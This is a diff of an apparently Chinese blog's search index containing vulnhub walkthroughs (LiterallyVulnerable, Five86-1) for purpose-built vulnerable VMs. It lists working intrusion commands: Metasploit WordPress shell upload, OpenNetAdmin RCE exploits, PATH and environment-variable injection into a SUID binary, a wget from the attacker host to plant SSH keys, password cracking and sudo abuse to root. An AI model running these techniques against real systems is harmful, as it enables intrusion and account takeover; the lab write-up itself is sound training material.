+<h3 id="登录-Wordpress-后台"><a href="#登录-Wordpress-后台" class="headerlink" title="登录 Wordpress 后台"></a>登录 Wordpress 后台</h3><p>都翻了一遍，得到一组用户名和密码：</p>
+<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">notadmin:Pa<span class="symbol">$</span><span class="symbol">$</span>w0rd13!&amp;</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-08-16-41-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08-16-41-43屏幕截图"> </p>
+<h2 id="登录系统-Getshell"><a href="#登录系统-Getshell" class="headerlink" title="登录系统(Getshell)"></a>登录系统(Getshell)</h2><p>利用 <code>MSF</code> 上传木马 getshell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exploit/unix/webapp/wp_admin_shell_upload</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-09-18-18-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-18-18-23屏幕截图"></p>
+<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer : literallyvulnerable</span><br><span class="line">OS : Linux literallyvulnerable 4.15.0-88-generic <span class="comment">#88-Ubuntu SMP Tue Feb 11 20:11:34 UTC 2020 x86_64</span></span><br><span class="line">Meterpreter : php/linux</span><br><span class="line">meterpreter &gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">######## lsb_release #############</span></span><br><span class="line">www-data@literallyvulnerable:$ lsb_release -a lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description: Ubuntu 18.04.3 LTS</span><br><span class="line">Release: 18.04</span><br><span class="line">Codename: bionic</span><br><span class="line"></span><br><span class="line"><span class="comment">####### /etc/passwd #######</span></span><br><span class="line">doe:x:1001:1001:Doe,,,:/home/doe:/bin/bash </span><br><span class="line">john:x:1000:1000:,,,:/home/john:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>寻找 SUID 程序，得到可疑文件：<code>itseasy</code> </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-09-19-27-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-19-27-43屏幕截图"> </p>
+<h2 id="权限提升-User"><a href="#权限提升-User" class="headerlink" title="权限提升(User)"></a>权限提升(User)</h2><p>运行 <code>itseasy</code> 得到当前目录绝对路径，看过一篇通过操控 <code>PATH</code> 参数值进行提权；怀疑程序调用了 <code>pwd</code> 命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">cp /bin/bash /tmp/<span class="built_in">pwd</span>    <span class="comment"># or echo "/bin/bash" &gt; /tmp/pwd</span></span><br><span class="line">chmod 777 /tmp/<span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
+
+<p>执行后，没有得到预期的结果</p>
+<p><code>objdump -d</code> 一下，看到个 <code>getenv</code> 函数，用来获取环境变量</p>
+<p>也就是可以通过改变环境变量的值来控制这个程序：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PWD=\$\(/bin/bash\)</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-09-20-28-54%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-28-54屏幕截图"> </p>
+<p><img src="2020-03-09-19-42-16%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-19-42-16屏幕截图"></p>
+<p>然后输入命令没有回显了，直接 SSH ：kali 下生成 ssh 公钥上传到目标机</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/john/.ssh &amp;&amp; wget http://172.16.252.129:8848/autorized_keys</span><br></pre></td></tr></table></figure>
+
+<h3 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h3><p>HOME 目录下的到一个 base64加密的密码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">am9objpZWlckczhZNDlJQiNaWko= </span><br><span class="line"><span class="built_in">echo</span><span class="string">"am9objpZWlckczhZNDlJQiNaWko="</span>| base64 -d </span><br><span class="line"></span><br><span class="line">john:YZW<span class="variable">$s8Y49IB</span><span class="comment">#ZZJ</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-09-19-54-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-19-54-52屏幕截图"> </p>
+<p><img src="2020-03-09-20-02-37%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-02-37屏幕截图"> </p>
+<p><img src="2020-03-09-20-05-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-05-51屏幕截图"></p>
+<p>搜索 SUID 程序：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find/ -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudopasswd root</span><br><span class="line">Sorry, user john is not allowed to execute <span class="string">'/usr/bin/passwd root'</span> as root on literallyvulnerable.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries forjohn on literallyvulnerable:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/</span><br><span class="line">sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line">    User john may run the following commands on literallyvulnerable: </span><br><span class="line">        (root) /var/www/html/test.html</span><br></pre></td></tr></table></figure>
+
+<p>可以运行 <code>/var/www/html/test.html</code> </p>
+<h2 id="权限提升-root"><a href="#权限提升-root" class="headerlink" title="权限提升(root)"></a>权限提升(root)</h2><p><code>/var/www/html</code> 目录下没有 <code>test.html</code> 文件，且 <code>john</code> 没有 <code>html</code> 目录的写权限，那就切换回 <code>www-data</code> 用户创建文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"/bin/bash"</span> &gt; test.html</span><br><span class="line">chmod 777 test.html</span><br></pre></td></tr></table></figure>
+
+<p><code>sudo</code> 运行，提权成功</p>
+<p><img src="2020-03-09-20-19-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-19-09屏幕截图"></p>
+<p><img src="2020-03-09-20-21-25%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-21-25屏幕截图"> </p>
+<p><img src="2020-03-09-20-21-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-21-43屏幕截图"> </p>
 ]]></content>
       <categories>
         <category>vulnhub</category>
@@ -1644,371 +2009,6 @@ nslookup会得到 DNS解析服务器保存在缓存中的非权威解答
 <br>
 
 <p>这里就是为了记一下， <code>sudo</code> 和 <code>passwd</code> 同时有 <code>SUID</code> 权限，且用户位于 <code>/etc/sudoers</code> 中的时候，可以修改 <code>root</code> 密码</p>
-]]></content>
-      <categories>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>vulnhub</tag>
-        <tag>OSCP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Five86-1</title>
-    <url>/2020/03/10/Five86-1/</url>
-    <content><![CDATA[<blockquote>
-<p><code>2020-02-14 14</code> —— <code>2020-02-14 16</code> </p>
-</blockquote>
-<br>
-
-<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">Description</span><br><span class="line">Five86<span class="number">-1</span> <span class="keyword">is</span> another purposely built vulnerable lab <span class="keyword">with</span> <span class="keyword">the</span> intent <span class="keyword">of</span> gaining experience <span class="keyword">in</span> <span class="keyword">the</span> world <span class="keyword">of</span> penetration testing.</span><br><span class="line"></span><br><span class="line">The ultimate goal <span class="keyword">of</span> this challenge <span class="keyword">is</span> <span class="keyword">to</span> <span class="keyword">get</span> root <span class="keyword">and</span> <span class="keyword">to</span> <span class="built_in">read</span> <span class="keyword">the</span> one <span class="keyword">and</span> only flag.</span><br><span class="line"></span><br><span class="line">Linux skills <span class="keyword">and</span> familiarity <span class="keyword">with</span> <span class="keyword">the</span> Linux command line are a must, <span class="keyword">as</span> <span class="keyword">is</span> <span class="keyword">some</span> experience <span class="keyword">with</span> basic penetration testing tools.</span><br><span class="line"></span><br><span class="line">For beginners, Google can be <span class="keyword">of</span> great assistance, <span class="keyword">but</span> you can always tweet <span class="keyword">me</span> <span class="keyword">at</span> @DCAU7 <span class="keyword">for</span> assistance <span class="keyword">to</span> <span class="keyword">get</span> you going again. But take note: I won't give you <span class="keyword">the</span> answer, instead, I'll give you an idea <span class="keyword">about</span> how <span class="keyword">to</span> move forward.</span><br><span class="line"></span><br><span class="line">Technical Information</span><br><span class="line">Five86<span class="number">-1</span> <span class="keyword">is</span> a VirtualBox VM built <span class="keyword">on</span> Debian <span class="number">64</span> bit, <span class="keyword">but</span> there shouldn't be any issues <span class="built_in">running</span> <span class="keyword">it</span> <span class="keyword">on</span> most PCs.</span><br><span class="line"></span><br><span class="line">Five86<span class="number">-1</span> has been tested successfully <span class="keyword">on</span> VMWare Player, <span class="keyword">but</span> <span class="keyword">if</span> there are any issues <span class="built_in">running</span> this VM <span class="keyword">in</span> VMware, have a <span class="built_in">read</span> <span class="keyword">through</span> <span class="keyword">of</span> this.</span><br><span class="line"></span><br><span class="line">It <span class="keyword">is</span> currently configured <span class="keyword">for</span> Bridged Networking, however, this can be changed <span class="keyword">to</span> suit your requirements. Networking <span class="keyword">is</span> configured <span class="keyword">for</span> DHCP.</span><br><span class="line"></span><br><span class="line">Installation <span class="keyword">is</span> simple - download <span class="keyword">it</span>, unzip <span class="keyword">it</span>, <span class="keyword">and</span> <span class="keyword">then</span> import <span class="keyword">it</span> <span class="keyword">into</span> VirtualBox <span class="keyword">or</span> VMWare <span class="keyword">and</span> away you go.</span><br><span class="line"></span><br><span class="line">Important</span><br><span class="line">While there should be no problems using this VM, <span class="keyword">by</span> downloading <span class="keyword">it</span>, you accept full responsibility <span class="keyword">for</span> any unintentional damage <span class="keyword">that</span> this VM may cause.</span><br><span class="line"></span><br><span class="line">In saying <span class="keyword">that</span>, there shouldn't be any problems, <span class="keyword">but</span> I feel <span class="keyword">the</span> need <span class="keyword">to</span> throw this out there just <span class="keyword">in</span> case.</span><br><span class="line"></span><br><span class="line">Credits</span><br><span class="line">A big thanks goes out <span class="keyword">to</span> <span class="keyword">the</span> members <span class="keyword">of</span> @m0tl3ycr3w.</span><br><span class="line"></span><br><span class="line">Contact</span><br><span class="line">I'm also very interested <span class="keyword">in</span> hearing how people go <span class="keyword">about</span> solving these challenges, so <span class="keyword">if</span> you're up <span class="keyword">for</span> writing a walkthrough, please do so <span class="keyword">and</span> send <span class="keyword">me</span> a link, <span class="keyword">or</span> alternatively, follow <span class="keyword">me</span> <span class="keyword">on</span> Twitter, <span class="keyword">and</span> DM <span class="keyword">me</span> (you can unfollow <span class="keyword">after</span> you've DM'd <span class="keyword">me</span> <span class="keyword">if</span> you'd prefer).</span><br><span class="line"></span><br><span class="line">I can be contacted via Twitter - @Five86_x</span><br></pre></td></tr></table></figure>
-
-<br>
-<br>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Kali : 192.168.56.109</span><br><span class="line">目标网段 : 192.168.56.1/24</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br>
-
-<p>主机存活：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -s -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure>
-
-<p>扫服务：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -n -Pn -sV -O 192.168.56.114</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">10000/tcp open  http    MiniServ 1.920 (Webmin httpd)</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<hr>
-<br>
-
-<p>访问 80 端口，无有价值信息</p>
-<p>例行扫目录：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch.py -u http://192.168.56.114 -e php --random-agents</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><img src="2020-02-14-14-35-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<p>经访问：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">########################</span></span><br><span class="line">[14:35:21] 200 -   30B  - /index.html    <span class="comment"># 404</span></span><br><span class="line">[14:35:25] 401 -  461B  - /reports          <span class="comment"># need user|passwd</span></span><br><span class="line">[14:35:25] 401 -  461B  - /reports/Webalizer/   <span class="comment"># need user|passwd</span></span><br><span class="line">[14:35:25] 200 -   29B  - /robots.txt</span><br><span class="line"><span class="comment">#####</span></span><br><span class="line">http://192.168.56.114/robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /ona</span><br><span class="line"><span class="comment">########################</span></span><br><span class="line">http://192.168.56.114/ona	<span class="comment"># OpenNetAdmin</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><img src="2020-02-14-14-45-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<p>搜索相关漏洞，得到远程命令执行：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit opennetadmin</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-02-14-14-44-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<h2 id="海滩登陆"><a href="#海滩登陆" class="headerlink" title="海滩登陆"></a>海滩登陆</h2><br>
-
-<p>使用 <code>47691.sh</code> 如果报错的话，可以先 <code>dos2unix</code> 转换一下格式，作者可能在 <code>dos</code> 环境下写的脚本</p>
-<br>
-
-<p><img src="2020-02-14-18-38-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-<br>
-
-<p>使用 MSF：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先复制到桌面</span></span><br><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/47772.rb ~/Desktop/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到 MSF 内利用</span></span><br><span class="line">cp 47772.rb /usr/share/metasploit-framework/modules/exploits/</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><img src="2020-02-14-15-10-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
-<br>
-
-<p>测试发现存在 <code>Python</code> 使用交互式 shell</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; shell</span><br><span class="line"></span><br><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p>先看 <code>/etc/passwd</code> 有多少用户及有价值信息。目录全无访问权</p>
-<br>
-
-<p><img src="2020-02-14-15-13-04%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
-<p><img src="2020-02-14-15-13-36%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<p>这个时就需要最后的搜刮一下，得到了一组用户密码。其他用户，无有价值信息：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -ri --color=auto --exclude-dir=proc/ <span class="string">'douglas'</span> / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><img src="2020-02-14-15-28-42%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
-<p><img src="2020-02-14-15-30-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<hr>
-<br>
-
-<p>Hash 破解，没跑成来，查了一下，会用到作者给的提示 <code>aefhrt</code>。使用 <code>crunch</code> 生产字典：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ crunch 10 10 aefhrt &gt;word.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">$ crunch 10 10 aefhrt -o word.txt</span><br><span class="line"></span><br><span class="line">$ john --wordlist=word.txt <span class="built_in">hash</span> </span><br><span class="line">$ john --show <span class="built_in">hash</span> </span><br><span class="line"></span><br><span class="line">?:fatherrrrr</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><img src="2020-02-14-15-51-31%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<h2 id="身份切换-SSH免密登陆"><a href="#身份切换-SSH免密登陆" class="headerlink" title="身份切换(SSH免密登陆)"></a>身份切换(SSH免密登陆)</h2><br>
-
-<p>登录 SSH，得到普通用户，目录下除了 <code>.ssh/</code> 外无其他有价值信息。</p>
-<p>可使用的 <code>sudo</code> 命令为 <code>cp</code> ：</p>
-<br>
-
-<p><img src="2020-02-14-16-03-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<p>涉及知识的盲区了，特地去查询记录了一下</p>
-<br>
-
-<p><code>cp</code> 命令可以配合  <code>SSH（authorized_keys）</code> 免密登录到其他用户：</p>
-<br>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 为目标生成 ssh key</span></span><br><span class="line">ssh-keygen -b 2048</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制生成的 id_rsa.pub 到 /tmp 下并改名为 authorized_kes</span></span><br><span class="line">cp /home/douglas/.ssh/id_rsa.pub /tmp/authorized_kes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 改变 authorized_kes 的权限</span></span><br><span class="line">chmod 777 authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到目标 .ssh/ 下</span></span><br><span class="line">sudo -u jen /bin/cp authorized_keys /home/jen/.ssh/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登陆</span></span><br><span class="line">ssh jen@127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<br>
-
-<p><img src="2020-02-14-16-16-13%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<p><img src="2020-02-14-16-18-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<p>说是有邮件，查看邮件，得到另一组用户名和密码，登陆成功。</p>
-<br>
-
-
-<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><br>
-
-<p>看目录，得到一个 <code>SUID</code> 的二进制文件，可以直接成为 <code>root</code> ，进 <code>root</code> 目录，得到 Flag</p>
-<br>
-<br>
-
-<p><img src="2020-02-14-16-25-30%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<p><img src="2020-02-14-16-28-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<hr>
-<br>
-
-<p>与其说是提权，不如说是作者准备好的外挂道具，让你可以一举成神，有种欲求不满的感觉，前面刚鼓起的劲，到了后面直接一键 <code>root</code> ，无法满足啊</p>
-<br>
-
-<p>不过，也是学到技能了</p>
-<br>
-
-<p>也可以使用如下方式：</p>
-<ul>
-<li>创建一个权限 <code>777</code> 的文件</li>
-<li>使用 <code>find</code> 命令查找 <code>Jen</code> 创建的文件</li>
-<li>使用 <code>cp</code> 命令，复制找到的文件 到 <code>777</code> 权限的 文件</li>
-<li><code>cat</code> 查看</li>
-</ul>
-<br>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sudo -u</span></span><br><span class="line">-u, --user=user              <span class="comment"># 以指定用户或 ID</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u jen /bin/cp /var/mail/jen ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>vulnhub</tag>
-        <tag>OSCP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>LiterallyVulnerable</title>
-    <url>/2020/03/19/LiterallyVulnerable/</url>
-    <content><![CDATA[<blockquote>
-<p>2020-03-08 14:26 — 2020-03-09</p>
-</blockquote>
-<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Flags</span>: <span class="number">3</span> (local.txt, user.txt &amp; root.txt)</span><br><span class="line">Difficulty <span class="attribute">Level</span>: Initial Shell (Easy) - Privileges Escalation (Intermediate)</span><br><span class="line"><span class="attribute">Website</span>: <span class="attribute">https</span>:<span class="comment">//ebryx.com</span></span><br><span class="line"><span class="attribute">Hint</span>: Maybe, you hasted and left some open holes unchecked?</span><br><span class="line">Literally Vulnerable is supposed to give beginners a taste of real-world scenarios and OSCP machines at the same time! It was inspired highly by the <span class="variable">@DC</span> series.</span><br><span class="line"></span><br><span class="line">You're supposed to know the big three (EEEs) Enumeration, Exploitation &amp; Escalation of pentesting to pwn the machine. The machine is supposed to be beginner-friendly and the difficulty level is Easy-Intermediate depending on your knowledge. You need to have enough information about Linux file types &amp; permissions for privileges escalation.</span><br><span class="line"></span><br><span class="line">Technical <span class="attribute">Information</span>:</span><br><span class="line">Just download, extract and load the .vmx file in VMware Workstation (tested on VMware Workstation <span class="number">15</span>.x.x)</span><br><span class="line">The adapter is currently NAT, networking is configured for DHCP and IP will get assigned automatically</span><br><span class="line"><span class="attribute">Contact</span>:</span><br><span class="line">You can either contact me on twitter <span class="variable">@syed__umar</span> or linkedin (/in/syedumararfeen/) for hints!</span><br><span class="line">There are three flags in the <span class="attribute">machine</span>: local.txt, user.txt &amp; root.txt. You're supposed to grab all three in order to completely pwn the machine. Hope you like the machine, best of luck! :)</span><br><span class="line"></span><br><span class="line">I'll try my best to continue with the series!</span><br><span class="line">--------</span><br><span class="line"><span class="attribute">From </span>: <span class="attribute">https</span>:<span class="comment">//www.vulnhub.com/entry/ua-literally-vulnerable,407/</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali：172.16.252.129</span><br><span class="line">目标：172.16.252.1/24</span><br></pre></td></tr></table></figure>
-
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主机存活：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -n -sn -T5 -v 172.16.252.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure>
-
-<p>目标端口服务：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -n -Pn -sV -O 172.16.252.131</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br></pre></td></tr></table></figure>
-
-<p>全部端口：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">21/tcp open ftp vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r-- 1 ftp ftp 325 Dec 04 13:05 backupPasswords </span><br><span class="line">| ftp-syst:</span><br><span class="line">| 	STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">| Connected to ::ffff:172.16.252.129</span><br><span class="line">| Logged <span class="keyword">in</span> as ftp</span><br><span class="line">| TYPE: ASCII</span><br><span class="line">| No session bandwidth <span class="built_in">limit</span></span><br><span class="line">| Session timeout <span class="keyword">in</span> seconds is 300</span><br><span class="line">| Control connection is plain text</span><br><span class="line">| Data connections will be plain text</span><br><span class="line">| At session startup, client count was 1</span><br><span class="line">| vsFTPd 3.0.3 - secure, fast, stable </span><br><span class="line">|_End of status</span><br><span class="line">22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) </span><br><span class="line">| ssh-hostkey:</span><br><span class="line">| 2048 2f:26:5b:e6:ae:9a:c0:26:76:26:24:00:a7:37:e6:c1 (RSA)</span><br><span class="line">| 256 79:c0:12:33:d6:6d:9a:bd:1f:11:aa:1c:39:1e:b8:95 (ECDSA) </span><br><span class="line">|_ 256 83:27:d3:79:d0:8b:6a:2a:23:57:5b:3c:d7:b4:e5:60 (ED25519)</span><br><span class="line">80/tcp open http nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-generator: WordPress 5.3</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Not so Vulnerable &amp;<span class="comment">#8211; Just another WordPress site </span></span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">65535/tcp open http </span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br></pre></td></tr></table></figure>
-
-<p>开启的端口：21、22、80、65535</p>
-<h3 id="FTP-匿名登陆"><a href="#FTP-匿名登陆" class="headerlink" title="FTP 匿名登陆"></a>FTP 匿名登陆</h3><p>FTP 可以匿名访问，得到几个密码，暂不知用途：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*<span class="variable">$eGRIf7v38s</span>&amp;p7 </span><br><span class="line">yP$*SV09YOrx7mY </span><br><span class="line">GmceC&amp;oOBtbnFCH </span><br><span class="line">3!IZguT2piU8X<span class="variable">$c</span> </span><br><span class="line">P&amp;s%F1D4<span class="comment">#KDBSeS</span></span><br><span class="line"><span class="variable">$EPid</span>%J2L9LufO5 </span><br><span class="line">nD!mb*aHON&amp;76&amp;G </span><br><span class="line">$*Ke7q2ko3tqoZo </span><br><span class="line">SCb<span class="variable">$I</span>^gDDqE34fA </span><br><span class="line">Ae%tM0XIWUMsCLp</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-08-14-48-33%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08 14-48-33屏幕截图"></p>
-<p> <img src="2020-03-08-14-49-20%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08 14-49-20屏幕截图">  </p>
-<h3 id="Web-目录枚举"><a href="#Web-目录枚举" class="headerlink" title="Web 目录枚举"></a>Web 目录枚举</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">80/tcp open http nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-generator: WordPress 5.3</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: <span class="keyword">Not</span> so Vulnerable &amp;#8211; Just another WordPress site </span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">65535/tcp open http </span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu<span class="built_in"> Default </span>Page: It works</span><br></pre></td></tr></table></figure>
-
-<p>80 端口： nginx + Wordpress</p>
-<p>65535端口：Apache</p>
-<p>控制台显示资源请求错误多，可以看到它是从 <code>literally.vulnerable</code> 请求资源，可以设置 DNS：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"172.16.252.131    literally.vulnerable"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-08-14-54-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08 14-54-43屏幕截图"></p>
-<p>先扫描 65535 端口，逐一访问，得到 <code>phpcms</code> 页面，访问需要密码，<code>wpsacn</code> 枚举</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch.py -u <span class="string">"http://172.16.252.131:65535"</span> -e php --random-agents -w /usr/share/wordlists/dirb/big.txt</span><br></pre></td></tr></table></figure>
-
